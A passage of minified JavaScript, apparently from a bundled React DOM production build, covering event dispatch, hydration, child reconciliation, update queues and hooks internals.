e;if((oe||Y)&&(Y=J.window===J?J:(Y=J.ownerDocument)?Y.defaultView||Y.parentWindow:window,oe?(de=l.relatedTarget||l.toElement,oe=$,de=de?Ns(de):null,de!==null&&(Ke=js(de),de!==Ke||de.tag!==5&&de.tag!==6)&&(de=null)):(oe=null,de=$),oe!==de)){if(me=wu,te="onMouseLeave",L="onMouseEnter",C="mouse",(t==="pointerout"||t==="pointerover")&&(me=Nu,te="onPointerLeave",L="onPointerEnter",C="pointer"),Ke=oe==null?Y:Zs(oe),D=de==null?Y:Zs(de),Y=new me(te,C+"leave",oe,l,J),Y.target=Ke,Y.relatedTarget=D,te=null,Ns(J)===$&&(me=new me(L,C+"enter",de,l,J),me.target=D,me.relatedTarget=Ke,te=me),Ke=te,oe&&de)t:{for(me=oe,L=de,C=0,D=me;D;D=Js(D))C++;for(D=0,te=L;te;te=Js(te))D++;for(;0<C-D;)me=Js(me),C--;for(;0<D-C;)L=Js(L),D--;for(;C--;){if(me===L||L!==null&&me===L.alternate)break t;me=Js(me),L=Js(L)}me=null}else me=null;oe!==null&&Yu(X,Y,oe,me,!1),de!==null&&Ke!==null&&Yu(X,Ke,de,me,!0)}}e:{if(Y=$?Zs($):window,oe=Y.nodeName&&Y.nodeName.toLowerCase(),oe==="select"||oe==="input"&&Y.type==="file")var pe=cx;else if(Eu(Y))if(Tu)pe=fx;else{pe=ux;var we=dx}else(oe=Y.nodeName)&&oe.toLowerCase()==="input"&&(Y.type==="checkbox"||Y.type==="radio")&&(pe=hx);if(pe&&(pe=pe(t,$))){Cu(X,pe,l,J);break e}we&&we(t,Y,$),t==="focusout"&&(we=Y._wrapperState)&&we.controlled&&Y.type==="number"&&Je(Y,"number",Y.value)}switch(we=$?Zs($):window,t){case"focusin":(Eu(we)||we.contentEditable==="true")&&(Ks=we,il=$,oa=null);break;case"focusout":oa=il=Ks=null;break;case"mousedown":ol=!0;break;case"contextmenu":case"mouseup":case"dragend":ol=!1,$u(X,l,J);break;case"selectionchange":if(xx)break;case"keydown":case"keyup":$u(X,l,J)}var je;if(rl)e:{switch(t){case"compositionstart":var ke="onCompositionStart";break e;case"compositionend":ke="onCompositionEnd";break e;case"compositionupdate":ke="onCompositionUpdate";break e}ke=void 0}else Qs?Su(t,l)&&(ke="onCompositionEnd"):t==="keydown"&&l.keyCode===229&&(ke="onCompositionStart");ke&&(ku&&l.locale!=="ko"&&(Qs||ke!=="onCompositionStart"?ke==="onCompositionEnd"&&Qs&&(je=vu()):(Wr=J,Yo="value"in Wr?Wr.value:Wr.textContent,Qs=!0)),we=pi($,ke),0<we.length&&(ke=new ju(ke,t,null,l,J),X.push({event:ke,listeners:we}),je?ke.data=je:(je=Au(l),je!==null&&(ke.data=je)))),(je=nx?ax(t,l):ix(t,l))&&($=pi($,"onBeforeInput"),0<$.length&&(J=new ju("onBeforeInput","beforeinput",null,l,J),X.push({event:J,listeners:$}),J.data=je))}Qu(X,r)})}function da(t,r,l){return{instance:t,listener:r,currentTarget:l}}function pi(t,r){for(var l=r+"Capture",u=[];t!==null;){var h=t,g=h.stateNode;h.tag===5&&g!==null&&(h=g,g=Vn(t,l),g!=null&&u.unshift(da(t,g,h)),g=Vn(t,r),g!=null&&u.push(da(t,g,h))),t=t.return}return u}function Js(t){if(t===null)return null;do t=t.return;while(t&&t.tag!==5);return t||null}function Yu(t,r,l,u,h){for(var g=r._reactName,y=[];l!==null&&l!==u;){var _=l,A=_.alternate,$=_.stateNode;if(A!==null&&A===u)break;_.tag===5&&$!==null&&(_=$,h?(A=Vn(l,g),A!=null&&y.unshift(da(l,A,_))):h||(A=Vn(l,g),A!=null&&y.push(da(l,A,_)))),l=l.return}y.length!==0&&t.push({event:r,listeners:y})}var yx=/\r\n?/g,wx=/\u0000|\uFFFD/g;function Ju(t){return(typeof t=="string"?t:""+t).replace(yx,`
`).replace(wx,"")}function xi(t,r,l){if(r=Ju(r),Ju(t)!==r&&l)throw Error(s(425))}function gi(){}var fl=null,ml=null;function pl(t,r){return t==="textarea"||t==="noscript"||typeof r.children=="string"||typeof r.children=="number"||typeof r.dangerouslySetInnerHTML=="object"&&r.dangerouslySetInnerHTML!==null&&r.dangerouslySetInnerHTML.__html!=null}var xl=typeof setTimeout=="function"?setTimeout:void 0,jx=typeof clearTimeout=="function"?clearTimeout:void 0,Xu=typeof Promise=="function"?Promise:void 0,Nx=typeof queueMicrotask=="function"?queueMicrotask:typeof Xu<"u"?function(t){return Xu.resolve(null).then(t).catch(kx)}:xl;function kx(t){setTimeout(function(){throw t})}function gl(t,r){var l=r,u=0;do{var h=l.nextSibling;if(t.removeChild(l),h&&h.nodeType===8)if(l=h.data,l==="/$"){if(u===0){t.removeChild(h),ea(r);return}u--}else l!=="$"&&l!=="$?"&&l!=="$!"||u++;l=h}while(l);ea(r)}function Hr(t){for(;t!=null;t=t.nextSibling){var r=t.nodeType;if(r===1||r===3)break;if(r===8){if(r=t.data,r==="$"||r==="$!"||r==="$?")break;if(r==="/$")return null}}return t}function Zu(t){t=t.previousSibling;for(var r=0;t;){if(t.nodeType===8){var l=t.data;if(l==="$"||l==="$!"||l==="$?"){if(r===0)return t;r--}else l==="/$"&&r++}t=t.previousSibling}return null}var Xs=Math.random().toString(36).slice(2),ur="__reactFiber$"+Xs,ua="__reactProps$"+Xs,yr="__reactContainer$"+Xs,bl="__reactEvents$"+Xs,Fx="__reactListeners$"+Xs,_x="__reactHandles$"+Xs;function Ns(t){var r=t[ur];if(r)return r;for(var l=t.parentNode;l;){if(r=l[yr]||l[ur]){if(l=r.alternate,r.child!==null||l!==null&&l.child!==null)for(t=Zu(t);t!==null;){if(l=t[ur])return l;t=Zu(t)}return r}t=l,l=t.parentNode}return null}function ha(t){return t=t[ur]||t[yr],!t||t.tag!==5&&t.tag!==6&&t.tag!==13&&t.tag!==3?null:t}function Zs(t){if(t.tag===5||t.tag===6)return t.stateNode;throw Error(s(33))}function bi(t){return t[ua]||null}var vl=[],en=-1;function Gr(t){return{current:t}}function Be(t){0>en||(t.current=vl[en],vl[en]=null,en--)}function De(t,r){en++,vl[en]=t.current,t.current=r}var Qr={},ut=Gr(Qr),Ft=Gr(!1),ks=Qr;function tn(t,r){var l=t.type.contextTypes;if(!l)return Qr;var u=t.stateNode;if(u&&u.__reactInternalMemoizedUnmaskedChildContext===r)return u.__reactInternalMemoizedMaskedChildContext;var h={},g;for(g in l)h[g]=r[g];return u&&(t=t.stateNode,t.__reactInternalMemoizedUnmaskedChildContext=r,t.__reactInternalMemoizedMaskedChildContext=h),h}function _t(t){return t=t.childContextTypes,t!=null}function vi(){Be(Ft),Be(ut)}function eh(t,r,l){if(ut.current!==Qr)throw Error(s(168));De(ut,r),De(Ft,l)}function th(t,r,l){var u=t.stateNode;if(r=r.childContextTypes,typeof u.getChildContext!="function")return l;u=u.getChildContext();for(var h in u)if(!(h in r))throw Error(s(108,se(t)||"Unknown",h));return Q({},l,u)}function yi(t){return t=(t=t.stateNode)&&t.__reactInternalMemoizedMergedChildContext||Qr,ks=ut.current,De(ut,t),De(Ft,Ft.current),!0}function rh(t,r,l){var u=t.stateNode;if(!u)throw Error(s(169));l?(t=th(t,r,ks),u.__reactInternalMemoizedMergedChildContext=t,Be(Ft),Be(ut),De(ut,t)):Be(Ft),De(Ft,l)}var wr=null,wi=!1,yl=!1;function sh(t){wr===null?wr=[t]:wr.push(t)}function Sx(t){wi=!0,sh(t)}function Kr(){if(!yl&&wr!==null){yl=!0;var t=0,r=Re;try{var l=wr;for(Re=1;t<l.length;t++){var u=l[t];do u=u(!0);while(u!==null)}wr=null,wi=!1}catch(h){throw wr!==null&&(wr=wr.slice(t+1)),au(zo,Kr),h}finally{Re=r,yl=!1}}return null}var rn=[],sn=0,ji=null,Ni=0,Wt=[],Vt=0,Fs=null,jr=1,Nr="";function _s(t,r){rn[sn++]=Ni,rn[sn++]=ji,ji=t,Ni=r}function nh(t,r,l){Wt[Vt++]=jr,Wt[Vt++]=Nr,Wt[Vt++]=Fs,Fs=t;var u=jr;t=Nr;var h=32-Xt(u)-1;u&=~(1<<h),l+=1;var g=32-Xt(r)+h;if(30<g){var y=h-h%5;g=(u&(1<<y)-1).toString(32),u>>=y,h-=y,jr=1<<32-Xt(r)+h|l<<h|u,Nr=g+t}else jr=1<<g|l<<h|u,Nr=t}function wl(t){t.return!==null&&(_s(t,1),nh(t,1,0))}function jl(t){for(;t===ji;)ji=rn[--sn],rn[sn]=null,Ni=rn[--sn],rn[sn]=null;for(;t===Fs;)Fs=Wt[--Vt],Wt[Vt]=null,Nr=Wt[--Vt],Wt[Vt]=null,jr=Wt[--Vt],Wt[Vt]=null}var It=null,Lt=null,Ue=!1,er=null;function ah(t,r){var l=Kt(5,null,null,0);l.elementType="DELETED",l.stateNode=r,l.return=t,r=t.deletions,r===null?(t.deletions=[l],t.flags|=16):r.push(l)}function ih(t,r){switch(t.tag){case 5:var l=t.type;return r=r.nodeType!==1||l.toLowerCase()!==r.nodeName.toLowerCase()?null:r,r!==null?(t.stateNode=r,It=t,Lt=Hr(r.firstChild),!0):!1;case 6:return r=t.pendingProps===""||r.nodeType!==3?null:r,r!==null?(t.stateNode=r,It=t,Lt=null,!0):!1;case 13:return r=r.nodeType!==8?null:r,r!==null?(l=Fs!==null?{id:jr,overflow:Nr}:null,t.memoizedState={dehydrated:r,treeContext:l,retryLane:1073741824},l=Kt(18,null,null,0),l.stateNode=r,l.return=t,t.child=l,It=t,Lt=null,!0):!1;default:return!1}}function Nl(t){return(t.mode&1)!==0&&(t.flags&128)===0}function kl(t){if(Ue){var r=Lt;if(r){var l=r;if(!ih(t,r)){if(Nl(t))throw Error(s(418));r=Hr(l.nextSibling);var u=It;r&&ih(t,r)?ah(u,l):(t.flags=t.flags&-4097|2,Ue=!1,It=t)}}else{if(Nl(t))throw Error(s(418));t.flags=t.flags&-4097|2,Ue=!1,It=t}}}function oh(t){for(t=t.return;t!==null&&t.tag!==5&&t.tag!==3&&t.tag!==13;)t=t.return;It=t}function ki(t){if(t!==It)return!1;if(!Ue)return oh(t),Ue=!0,!1;var r;if((r=t.tag!==3)&&!(r=t.tag!==5)&&(r=t.type,r=r!=="head"&&r!=="body"&&!pl(t.type,t.memoizedProps)),r&&(r=Lt)){if(Nl(t))throw lh(),Error(s(418));for(;r;)ah(t,r),r=Hr(r.nextSibling)}if(oh(t),t.tag===13){if(t=t.memoizedState,t=t!==null?t.dehydrated:null,!t)throw Error(s(317));e:{for(t=t.nextSibling,r=0;t;){if(t.nodeType===8){var l=t.data;if(l==="/$"){if(r===0){Lt=Hr(t.nextSibling);break e}r--}else l!=="$"&&l!=="$!"&&l!=="$?"||r++}t=t.nextSibling}Lt=null}}else Lt=It?Hr(t.stateNode.nextSibling):null;return!0}function lh(){for(var t=Lt;t;)t=Hr(t.nextSibling)}function nn(){Lt=It=null,Ue=!1}function Fl(t){er===null?er=[t]:er.push(t)}var Ax=U.ReactCurrentBatchConfig;function fa(t,r,l){if(t=l.ref,t!==null&&typeof t!="function"&&typeof t!="object"){if(l._owner){if(l=l._owner,l){if(l.tag!==1)throw Error(s(309));var u=l.stateNode}if(!u)throw Error(s(147,t));var h=u,g=""+t;return r!==null&&r.ref!==null&&typeof r.ref=="function"&&r.ref._stringRef===g?r.ref:(r=function(y){var _=h.refs;y===null?delete _[g]:_[g]=y},r._stringRef=g,r)}if(typeof t!="string")throw Error(s(284));if(!l._owner)throw Error(s(290,t))}return t}function Fi(t,r){throw t=Object.prototype.toString.call(r),Error(s(31,t==="[object Object]"?"object with keys {"+Object.keys(r).join(", ")+"}":t))}function ch(t){var r=t._init;return r(t._payload)}function dh(t){function r(L,C){if(t){var D=L.deletions;D===null?(L.deletions=[C],L.flags|=16):D.push(C)}}function l(L,C){if(!t)return null;for(;C!==null;)r(L,C),C=C.sibling;return null}function u(L,C){for(L=new Map;C!==null;)C.key!==null?L.set(C.key,C):L.set(C.index,C),C=C.sibling;return L}function h(L,C){return L=ss(L,C),L.index=0,L.sibling=null,L}function g(L,C,D){return L.index=D,t?(D=L.alternate,D!==null?(D=D.index,D<C?(L.flags|=2,C):D):(L.flags|=2,C)):(L.flags|=1048576,C)}function y(L){return t&&L.alternate===null&&(L.flags|=2),L}function _(L,C,D,te){return C===null||C.tag!==6?(C=xc(D,L.mode,te),C.return=L,C):(C=h(C,D),C.return=L,C)}function A(L,C,D,te){var pe=D.type;return pe===G?J(L,C,D.props.children,te,D.key):C!==null&&(C.elementType===pe||typeof pe=="object"&&pe!==null&&pe.$$typeof===ie&&ch(pe)===C.type)?(te=h(C,D.props),te.ref=fa(L,C,D),te.return=L,te):(te=Ki(D.type,D.key,D.props,null,L.mode,te),te.ref=fa(L,C,D),te.return=L,te)}function $(L,C,D,te){return C===null||C.tag!==4||C.stateNode.containerInfo!==D.containerInfo||C.stateNode.implementation!==D.implementation?(C=gc(D,L.mode,te),C.return=L,C):(C=h(C,D.children||[]),C.return=L,C)}function J(L,C,D,te,pe){return C===null||C.tag!==7?(C=Is(D,L.mode,te,pe),C.return=L,C):(C=h(C,D),C.return=L,C)}function X(L,C,D){if(typeof C=="string"&&C!==""||typeof C=="number")return C=xc(""+C,L.mode,D),C.return=L,C;if(typeof C=="object"&&C!==null){switch(C.$$typeof){case z:return D=Ki(C.type,C.key,C.props,null,L.mode,D),D.ref=fa(L,null,C),D.return=L,D;case H:return C=gc(C,L.mode,D),C.return=L,C;case ie:var te=C._init;return X(L,te(C._payload),D)}if(br(C)||W(C))return C=Is(C,L.mode,D,null),C.return=L,C;Fi(L,C)}return null}function Y(L,C,D,te){var pe=C!==null?C.key:null;if(typeof D=="string"&&D!==""||typeof D=="number")return pe!==null?null:_(L,C,""+D,te);if(typeof D=="object"&&D!==null){switch(D.$$typeof){case z:return D.key===pe?A(L,C,D,te):null;case H:return D.key===pe?$(L,C,D,te):null;case ie:return pe=D._init,Y(L,C,pe(D._payload),te)}if(br(D)||W(D))return pe!==null?null:J(L,C,D,te,null);Fi(L,D)}return null}function oe(L,C,D,te,pe){if(typeof te=="string"&&te!==""||typeof te=="number")return L=L.get(D)||null,_(C,L,""+te,pe);if(typeof te=="object"&&te!==null){switch(te.$$typeof){case z:return L=L.get(te.key===null?D:te.key)||null,A(C,L,te,pe);case H:return L=L.get(te.key===null?D:te.key)||null,$(C,L,te,pe);case ie:var we=te._init;return oe(L,C,D,we(te._payload),pe)}if(br(te)||W(te))return L=L.get(D)||null,J(C,L,te,pe,null);Fi(C,te)}return null}function de(L,C,D,te){for(var pe=null,we=null,je=C,ke=C=0,at=null;je!==null&&ke<D.length;ke++){je.index>ke?(at=je,je=null):at=je.sibling;var Te=Y(L,je,D[ke],te);if(Te===null){je===null&&(je=at);break}t&&je&&Te.alternate===null&&r(L,je),C=g(Te,C,ke),we===null?pe=Te:we.sibling=Te,we=Te,je=at}if(ke===D.length)return l(L,je),Ue&&_s(L,ke),pe;if(je===null){for(;ke<D.length;ke++)je=X(L,D[ke],te),je!==null&&(C=g(je,C,ke),we===null?pe=je:we.sibling=je,we=je);return Ue&&_s(L,ke),pe}for(je=u(L,je);ke<D.length;ke++)at=oe(je,L,ke,D[ke],te),at!==null&&(t&&at.alternate!==null&&je.delete(at.key===null?ke:at.key),C=g(at,C,ke),we===null?pe=at:we.sibling=at,we=at);return t&&je.forEach(function(ns){return r(L,ns)}),Ue&&_s(L,ke),pe}function me(L,C,D,te){var pe=W(D);if(typeof pe!="function")throw Error(s(150));if(D=pe.call(D),D==null)throw Error(s(151));for(var we=pe=null,je=C,ke=C=0,at=null,Te=D.next();je!==null&&!Te.done;ke++,Te=D.next()){je.index>ke?(at=je,je=null):at=je.sibling;var ns=Y(L,je,Te.value,te);if(ns===null){je===null&&(je=at);break}t&&je&&ns.alternate===null&&r(L,je),C=g(ns,C,ke),we===null?pe=ns:we.sibling=ns,we=ns,je=at}if(Te.done)return l(L,je),Ue&&_s(L,ke),pe;if(je===null){for(;!Te.done;ke++,Te=D.next())Te=X(L,Te.value,te),Te!==null&&(C=g(Te,C,ke),we===null?pe=Te:we.sibling=Te,we=Te);return Ue&&_s(L,ke),pe}for(je=u(L,je);!Te.done;ke++,Te=D.next())Te=oe(je,L,ke,Te.value,te),Te!==null&&(t&&Te.alternate!==null&&je.delete(Te.key===null?ke:Te.key),C=g(Te,C,ke),we===null?pe=Te:we.sibling=Te,we=Te);return t&&je.forEach(function(og){return r(L,og)}),Ue&&_s(L,ke),pe}function Ke(L,C,D,te){if(typeof D=="object"&&D!==null&&D.type===G&&D.key===null&&(D=D.props.children),typeof D=="object"&&D!==null){switch(D.$$typeof){case z:e:{for(var pe=D.key,we=C;we!==null;){if(we.key===pe){if(pe=D.type,pe===G){if(we.tag===7){l(L,we.sibling),C=h(we,D.props.children),C.return=L,L=C;break e}}else if(we.elementType===pe||typeof pe=="object"&&pe!==null&&pe.$$typeof===ie&&ch(pe)===we.type){l(L,we.sibling),C=h(we,D.props),C.ref=fa(L,we,D),C.return=L,L=C;break e}l(L,we);break}else r(L,we);we=we.sibling}D.type===G?(C=Is(D.props.children,L.mode,te,D.key),C.return=L,L=C):(te=Ki(D.type,D.key,D.props,null,L.mode,te),te.ref=fa(L,C,D),te.return=L,L=te)}return y(L);case H:e:{for(we=D.key;C!==null;){if(C.key===we)if(C.tag===4&&C.stateNode.containerInfo===D.containerInfo&&C.stateNode.implementation===D.implementation){l(L,C.sibling),C=h(C,D.children||[]),C.return=L,L=C;break e}else{l(L,C);break}else r(L,C);C=C.sibling}C=gc(D,L.mode,te),C.return=L,L=C}return y(L);case ie:return we=D._init,Ke(L,C,we(D._payload),te)}if(br(D))return de(L,C,D,te);if(W(D))return me(L,C,D,te);Fi(L,D)}return typeof D=="string"&&D!==""||typeof D=="number"?(D=""+D,C!==null&&C.tag===6?(l(L,C.sibling),C=h(C,D),C.return=L,L=C):(l(L,C),C=xc(D,L.mode,te),C.return=L,L=C),y(L)):l(L,C)}return Ke}var an=dh(!0),uh=dh(!1),_i=Gr(null),Si=null,on=null,_l=null;function Sl(){_l=on=Si=null}function Al(t){var r=_i.current;Be(_i),t._currentValue=r}function El(t,r,l){for(;t!==null;){var u=t.alternate;if((t.childLanes&r)!==r?(t.childLanes|=r,u!==null&&(u.childLanes|=r)):u!==null&&(u.childLanes&r)!==r&&(u.childLanes|=r),t===l)break;t=t.return}}function ln(t,r){Si=t,_l=on=null,t=t.dependencies,t!==null&&t.firstContext!==null&&((t.lanes&r)!==0&&(St=!0),t.firstContext=null)}function Ht(t){var r=t._currentValue;if(_l!==t)if(t={context:t,memoizedValue:r,next:null},on===null){if(Si===null)throw Error(s(308));on=t,Si.dependencies={lanes:0,firstContext:t}}else on=on.next=t;return r}var Ss=null;function Cl(t){Ss===null?Ss=[t]:Ss.push(t)}function hh(t,r,l,u){var h=r.interleaved;return h===null?(l.next=l,Cl(r)):(l.next=h.next,h.next=l),r.interleaved=l,kr(t,u)}function kr(t,r){t.lanes|=r;var l=t.alternate;for(l!==null&&(l.lanes|=r),l=t,t=t.return;t!==null;)t.childLanes|=r,l=t.alternate,l!==null&&(l.childLanes|=r),l=t,t=t.return;return l.tag===3?l.stateNode:null}var Yr=!1;function Tl(t){t.updateQueue={baseState:t.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function fh(t,r){t=t.updateQueue,r.updateQueue===t&&(r.updateQueue={baseState:t.baseState,firstBaseUpdate:t.firstBaseUpdate,lastBaseUpdate:t.lastBaseUpdate,shared:t.shared,effects:t.effects})}function Fr(t,r){return{eventTime:t,lane:r,tag:0,payload:null,callback:null,next:null}}function Jr(t,r,l){var u=t.updateQueue;if(u===null)return null;if(u=u.shared,(Ce&2)!==0){var h=u.pending;return h===null?r.next=r:(r.next=h.next,h.next=r),u.pending=r,kr(t,l)}return h=u.interleaved,h===null?(r.next=r,Cl(u)):(r.next=h.next,h.next=r),u.interleaved=r,kr(t,l)}function Ai(t,r,l){if(r=r.updateQueue,r!==null&&(r=r.shared,(l&4194240)!==0)){var u=r.lanes;u&=t.pendingLanes,l|=u,r.lanes=l,Vo(t,l)}}function mh(t,r){var l=t.updateQueue,u=t.alternate;if(u!==null&&(u=u.updateQueue,l===u)){var h=null,g=null;if(l=l.firstBaseUpdate,l!==null){do{var y={eventTime:l.eventTime,lane:l.lane,tag:l.tag,payload:l.payload,callback:l.callback,next:null};g===null?h=g=y:g=g.next=y,l=l.next}while(l!==null);g===null?h=g=r:g=g.next=r}else h=g=r;l={baseState:u.baseState,firstBaseUpdate:h,lastBaseUpdate:g,shared:u.shared,effects:u.effects},t.updateQueue=l;return}t=l.lastBaseUpdate,t===null?l.firstBaseUpdate=r:t.next=r,l.lastBaseUpdate=r}function Ei(t,r,l,u){var h=t.updateQueue;Yr=!1;var g=h.firstBaseUpdate,y=h.lastBaseUpdate,_=h.shared.pending;if(_!==null){h.shared.pending=null;var A=_,$=A.next;A.next=null,y===null?g=$:y.next=$,y=A;var J=t.alternate;J!==null&&(J=J.updateQueue,_=J.lastBaseUpdate,_!==y&&(_===null?J.firstBaseUpdate=$:_.next=$,J.lastBaseUpdate=A))}if(g!==null){var X=h.baseState;y=0,J=$=A=null,_=g;do{var Y=_.lane,oe=_.eventTime;if((u&Y)===Y){J!==null&&(J=J.next={eventTime:oe,lane:0,tag:_.tag,payload:_.payload,callback:_.callback,next:null});e:{var de=t,me=_;switch(Y=r,oe=l,me.tag){case 1:if(de=me.payload,typeof de=="function"){X=de.call(oe,X,Y);break e}X=de;break e;case 3:de.flags=de.flags&-65537|128;case 0:if(de=me.payload,Y=typeof de=="function"?de.call(oe,X,Y):de,Y==null)break e;X=Q({},X,Y);break e;case 2:Yr=!0}}_.callback!==null&&_.lane!==0&&(t.flags|=64,Y=h.effects,Y===null?h.effects=[_]:Y.push(_))}else oe={eventTime:oe,lane:Y,tag:_.tag,payload:_.payload,callback:_.callback,next:null},J===null?($=J=oe,A=X):J=J.next=oe,y|=Y;if(_=_.next,_===null){if(_=h.shared.pending,_===null)break;Y=_,_=Y.next,Y.next=null,h.lastBaseUpdate=Y,h.shared.pending=null}}while(!0);if(J===null&&(A=X),h.baseState=A,h.firstBaseUpdate=$,h.lastBaseUpdate=J,r=h.shared.interleaved,r!==null){h=r;do y|=h.lane,h=h.next;while(h!==r)}else g===null&&(h.shared.lanes=0);Cs|=y,t.lanes=y,t.memoizedState=X}}function ph(t,r,l){if(t=r.effects,r.effects=null,t!==null)for(r=0;r<t.length;r++){var u=t[r],h=u.callback;if(h!==null){if(u.callback=null,u=l,typeof h!="function")throw Error(s(191,h));h.call(u)}}}var ma={},hr=Gr(ma),pa=Gr(ma),xa=Gr(ma);function As(t){if(t===ma)throw Error(s(174));return t}function Pl(t,r){switch(De(xa,r),De(pa,t),De(hr,ma),t=r.nodeType,t){case 9:case 11:r=(r=r.documentElement)?r.namespaceURI:Ro(null,"");break;default:t=t===8?r.parentNode:r,r=t.namespaceURI||null,t=t.tagName,r=Ro(r,t)}Be(hr),De(hr,r)}function cn(){Be(hr),Be(pa),Be(xa)}function xh(t){As(xa.current);var r=As(hr.current),l=Ro(r,t.type);r!==l&&(De(pa,t),De(hr,l))}function Rl(t){pa.current===t&&(Be(hr),Be(pa))}var We=Gr(0);function Ci(t){for(var r=t;r!==null;){if(r.tag===13){var l=r.memoizedState;if(l!==null&&(l=l.dehydrated,l===null||l.data==="$?"||l.data==="$!"))return r}else if(r.tag===19&&r.memoizedProps.revealOrder!==void 0){if((r.flags&128)!==0)return r}else if(r.child!==null){r.child.return=r,r=r.child;continue}if(r===t)break;for(;r.sibling===null;){if(r.return===null||r.return===t)return null;r=r.return}r.sibling.return=r.return,r=r.sibling}return null}var Il=[];function Ll(){for(var t=0;t<Il.length;t++)Il[t]._workInProgressVersionPrimary=null;Il.length=0}var Ti=U.ReactCurrentDispatcher,Ol=U.ReactCurrentBatchConfig,Es=0,Ve=null,Xe=null,st=null,Pi=!1,ga=!1,ba=0,Ex=0;function ht(){throw Error(s(321))}function Dl(t,r){if(r===null)return!1;for(var l=0;l<r.length&&l<t.length;l++)if(!Zt(t[l],r[l]))return!1;return!0}function Ml(t,r,l,u,h,g){if(Es=g,Ve=r,r.memoizedState=null,r.updateQueue=null,r.lanes=0,Ti.current=t===null||t.memoizedState===null?Rx:Ix,t=l(u,h),ga){g=0;do{if(ga=!1,ba=0,25<=g)throw Error(s(301));g+=1,st=Xe=null,r.updateQueue=null,Ti.current=Lx,t=l(u,h)}while(ga)}if(Ti.current=Li,r=Xe!==null&&Xe.next!==null,Es=0,st=Xe=Ve=null,Pi=!1,r)throw Error(s(300));return t}function $l(){var t=ba!==0;return ba=0,t}function fr(){var t={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return st===null?Ve.memoizedState=st=t:st=st.next=t,st}function Gt(){if(Xe===null){var t=Ve.alternate;t=t!==null?t.memoizedState:null}else t=Xe.next;var r=st===null?Ve.memoizedState:st.next;if(r!==null)st=r,Xe=t;else{if(t===null)throw Error(s(310));Xe=t,t={memoizedState:Xe.memoizedState,baseState:Xe.baseState,baseQueue:Xe.baseQueue,queue:Xe.queue,next:null},st===null?Ve.memoizedState=st=t:st=st.next=t}return st}function va(t,r){return typeof r=="function"?r(t):r}function Bl(t){var r=Gt(),l=r.queue;if(l===null)throw Error(s(311));l.lastRenderedReducer=t;var u=Xe,h=u.baseQueue,g=l.pending;if(g!==null){if(h!==null){var y=h.next;h.next=g.next,g.next=y}u.baseQueue=h=g,l.pending=null}if(h!==null){g=h.next,u=u.baseState;var _=y=null,A=null,$=g;do{var J=$.lane;if((Es&J)===J)A!==null&&(A=A.next={lane:0,action:$.action,hasEagerState:$.hasEagerState,eagerState:$.eagerState,next:null}),u=$.hasEagerState?$.eagerState:t(u,$.action);else{var X={lane:J,action:$.action,hasEagerState:$.hasEagerState,eagerState:$.eagerState,next:null};A===null?(_=A=X,y=u):A=A.next=X,Ve.lanes|=J,Cs|=J}$=$.next}while($!==null&&$!==g);A===null?y=u:A.next=_,Zt(u,r.memoizedState)||(St=!0),r.memoizedState=u,r.baseState=y,r.baseQueue=A,l.lastRenderedState=u}if(t=l.interleaved,t!==null){h=t;do g=h.lane,Ve.lanes|=g,Cs|=g,h=h.next;while(h!==t)}else h===null&&(l.lanes=0);return[r.memoizedState,l.dispatch]}function Ul(t){var r=Gt(),l=r.queue;if(l===null)throw Error(s(311));l.lastRenderedReducer=t;var u=l.dispatch,h=l.pending,g=r.memoizedState;if(h!==null){l.pending=null;var y=h=h.next;do g=t(g,y.action),y=y.next;while(y!==h);Zt(g,r.memoizedState)||(St=!0),r.memoizedState=g,r.baseQueue===null&&(r.baseState=g),l.lastRenderedState=g}return[g,u]}function gh(){}function bh(t,r){var l=Ve,u=Gt(),h=r(),g=!Zt(u.memoizedState,h);if(g&&(u.memoizedState=h,St=!0),u=u.queue,zl(wh.bind(null,l,u,t),[t]),u.getSnapshot!==r||g||st!==null&&st.memoizedState.tag&1){if(l.flags|=2048,ya(9,yh.bind(null,l,u,h,r),void 0,null),nt===null)throw Error(s(349));(Es&30)!==0||vh(l,r,h)}return h}function vh(t,r,l){t.flags|=16384,t={getSnapshot:r,value:l},r=Ve.updateQueue,r===null?(r={lastEffect:null,stores:null},Ve.updateQueue=r,r.stores=[t]):(l=r.stores,l===null?r.stores=[t]:l.push(t))}function yh(t,r,l,u){r.value=l,r.getSnapshot=u,jh(r)&&Nh(t)}function wh(t,r,l){return l(function(){jh(r)&&Nh(t)})}function jh(t){var r=t.getSnapshot;t=t.value;try{var l=r();return!Zt(t,l)}catch{return!0}}function Nh(t){var r=kr(t,1);r!==null&&nr(r,t,1,-1)}function kh(t){var r=fr();return typeof t=="function"&&(t=t()),r.memoizedState=r.baseState=t,t={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:va,lastRenderedState:t},r.queue=t,t=t.dispatch=Px.bind(null,Ve,t),[r.memoizedState,t]}function ya(t,r,l,u){return t={tag:t,create:r,destroy:l,deps:u,next:null},r=Ve.updateQueue,r===null?(r={lastEffect:null,stores:null},Ve.updateQueue=r,r.lastEffect=t.next=t):(l=r.lastEffect,l===null?r.lastEffect=t.next=t:(u=l.next,l.next=t,t.next=u,r.lastEffect=t)),t}function Fh(){return Gt().memoizedState}function Ri(t,r,l,u){var h=fr();Ve.flags|=t,h.memoizedState=ya(1|r,l,void 0,u===void 0?null:u)}function Ii(t,r,l,u){var h=Gt();u=u===void 0?null:u;var g=void 0;if(Xe!==null){var y=Xe.memoizedState;if(g=y.destroy,u!==null&&Dl(u,y.deps)){h.memoizedState=ya(r,l,g,u);return}}Ve.flags|=t,h.memoizedState=ya(1|r,l,g,u)}function _h(t,r){return Ri(8390656,8,t,r)}function zl(t,r){return Ii(2048,8,t,r)}function Sh(t,r){return Ii(4,2,t,r)}function Ah(t,r){return Ii(4,4,t,r)}function Eh(t,r){if(typeof r=="function")return t=t(),r(t),function(){r(null)};if(r!=null)return t=t(),r.current=t,function(){r.current=null}}function Ch(t,r,l){return l=l!=null?l.concat([t]):null,Ii(4,4,Eh.bind(null,r,t),l)}function ql(){}function Th(t,r){var l=Gt();r=r===void 0?null:r;var u=l.memoizedState;return u!==null&&r!==null&&Dl(r,u[1])?u[0]:(l.memoizedState=[t,r],t)}function Ph(t,r){var l=Gt();r=r===void 0?null:r;var u=l.memoizedState;return u!==null&&r!==null&&Dl(r,u[1])?u[0]:(t=t(),l.memoizedState=[t,r],t)}function Rh(t,r,l){return(Es&21)===0?(t.baseState&&(t.baseState=!1,St=!0),t.memoizedState=l):(Zt(l,r)||(l=cu(),Ve.lanes|=l,Cs|=l,t.baseState=!0),r)}function Cx(t,r){var 